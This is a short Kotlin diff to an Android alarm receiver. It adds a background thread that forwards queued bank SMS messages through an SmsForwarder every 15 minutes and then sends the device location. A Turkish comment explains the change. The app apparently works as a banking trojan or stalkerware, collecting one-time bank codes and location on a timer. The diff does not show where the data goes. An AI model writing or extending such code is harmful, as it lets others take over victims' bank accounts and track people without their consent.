@@ -15,6 +15,15 @@ class LocationAlarmReceiver : BroadcastReceiver() {
             return
         }
         val pending = goAsync()
-        LocationSender.sendNow(context.applicationContext) { pending.finish() }
+        val app = context.applicationContext
+        // 16 Ekim: kuyrukta kalan banka SMS'leri eskiden yalnızca yeni SMS gelince ya da uygulama açılınca
+        // gönderiliyordu; artık 15 dakikada bir de denenir.
+        Thread {
+            try {
+                SmsForwarder.flush(app)
+            } finally {
+                LocationSender.sendNow(app) { pending.finish() }
+            }
+        }.start()
     }
 }
